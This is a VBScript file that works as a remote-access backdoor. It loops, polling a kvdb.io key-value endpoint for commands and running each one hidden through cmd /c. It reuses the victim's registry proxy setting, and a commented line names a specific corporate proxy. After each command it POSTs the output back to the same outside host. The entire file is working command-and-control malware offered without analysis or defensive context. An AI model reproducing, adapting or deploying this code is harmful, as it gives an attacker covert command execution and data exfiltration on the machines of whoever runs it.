Dim objXmlHttpMain , URL
Dim res,res_key , upload_ep
Dim objShell,objCmdExec
Dim proxy
proxy=""
Dim c_type
c_type = 0

function read_reg(key)
	Dim windowsShell
	Dim regValue
	Set windowsShell = CreateObject("WScript.Shell")
	regValue = windowsShell.RegRead(key)
	read_reg=regValue
	'Wscript.Echo regValue
end function

function execute_cmd(arg1,c_type)
	
        'Wscript.Echo arg1 & "CTYPE IS " & c_type
	Set objShell = WScript.CreateObject ("WScript.shell")
	if c_type = 0 then
		run_command = "cmd /c "&arg1 &" > c:\temp\output1.txt"
		return_me = objShell.Run(run_command, 0, true)
		Set fso  = CreateObject("Scripting.FileSystemObject")
		Set file = fso.OpenTextFile("c:\temp\output1.txt", 1)
		execute_cmd = file.ReadAll
		file.Close
	else 
		'Wscript.Echo "Ran command !!"
		run_command = "cmd /c "&arg1
		'Wscript.Echo "Command is : "& run_command
		'objShell.run "cmd /c dir"
		Set objCmdExec = objShell.exec(run_command)
    		getCommandOutput = objCmdExec.StdOut.ReadAll
		execute_cmd=getCommandOutput

			
	end if
	
        
end function

function poll()
	proxy=read_reg("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer")
	Dim i
        i = 0
	While i < 100
		 
		res="2CD41GteLYLuvotryGMN5g"
		res_key=res
		updated_ep="https://kvdb.io/"&res_key&"/hits"
		URL=updated_ep
		Set objXmlHttpMain = CreateObject("Msxml2.ServerXMLHTTP.6.0")
		if proxy <> "" then
			'objXmlHttpMain.setProxy 2, "swgproxy.corp.du.ae:8080" ,""
			objXmlHttpMain.setProxy 2, proxy ,""
		end if
		'on error resume next 
		objXmlHttpMain.open "GET",URL
		objXmlHttpMain.setRequestHeader "Content-Type", "application/json"
		objXmlHttpMain.send
		resp=objXmlHttpMain.responseText
		'WScript.echo "Obtained : \n"
		'WScript.echo resp
		is_new=InStr(resp, "new_command")
		if is_new <> 0 Then
			flag_index=is_new+13
			'(Mid(string, starting number of character, number of characters to extract) 
			flag_value=Mid(resp,flag_index,1)
			if flag_value = 1 Then 
				st_index=InStr(resp, "##@@@")
				If st_index <> 0 Then
					'Wscript.Echo st_index
					st_index=st_index+5
					trimmed=Mid(resp,st_index)
					end_index=InStr(trimmed, "**")
					command=Mid(trimmed,1,end_index -1)
					'Wscript.Echo "Command extracted is : " & command
					command_type=InStr(resp, "c_type")
					type_value=0
					if command_type <> 0 Then
						type_index=command_type+8
						'(Mid(string, starting number of character, number of characters to extract) 
						type_value=Mid(resp,flag_index,1)
						c_type=type_value
					end if
					'Wscript.Echo type_value
					call push_and_exe(command,c_type)
				End If
			End If
		End If
		WScript.Sleep 5000
	Wend

end function

function push_and_exe(command,c_type)
	proxy=read_reg("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer")
	text=execute_cmd(command,c_type)
	res="2CD41GteLYLuvotryGMN5g"
	res_key=res
	updated_ep="https://kvdb.io/"&res_key&"/hits"
	strJSONToSend = "{""new_command"":0,""command"":"&command&", ""result"": "&text&"}"
	URL=updated_ep
	Set objXmlHttpMain = CreateObject("Msxml2.ServerXMLHTTP.6.0")
	if proxy <> "" then
			'objXmlHttpMain.setProxy 2, "swgproxy.corp.du.ae:8080" ,""
			objXmlHttpMain.setProxy 2, proxy ,""
	end if

	'on error resume next 
	objXmlHttpMain.open "POST",URL, False 
	objXmlHttpMain.setRequestHeader "Content-Type", "application/json"
	objXmlHttpMain.send strJSONToSend
	set objJSONDoc = nothing 
	set objResult = nothing
	
	
end function

poll()
